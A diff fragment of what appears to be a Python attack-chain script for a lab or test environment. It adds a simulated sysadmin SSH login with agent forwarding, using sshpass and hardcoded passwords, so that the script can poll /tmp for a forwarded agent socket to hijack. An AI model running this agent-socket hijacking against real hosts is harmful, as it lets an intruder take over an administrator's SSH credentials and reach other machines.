@@ -164,9 +164,22 @@ time.sleep(600)
     
     # In a real scenario, we would wait indefinitely. For the attack chain, 
     # we'll poll for the socket for a maximum of 60 seconds.
-    # We expect the test framework or user to simulate the login concurrently.
+    # The test framework simulates the sysadmin login concurrently.
     
+    def _simulate_sysadmin_login():
+        import subprocess
+        log("[*] SIMULATION: Sysadmin logs into Apache from his workstation (ssh -A)...")
+        cmd = (
+            "sshpass -p 'password' ssh -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null "
+            "vinzenz.fedora@10.30.0.8 "
+            "\"sshpass -p 'VinzenzAdmin!2026' ssh -A -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null "
+            "vinzenz.fedora@10.30.0.2 'sleep 20'\""
+        )
+        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
     log("[*] Waiting for sysadmin to log in via 'ssh -A' (polling /tmp)...")
+    _simulate_sysadmin_login()
+    
     socket_path = None
     deadline = time.time() + 60
     
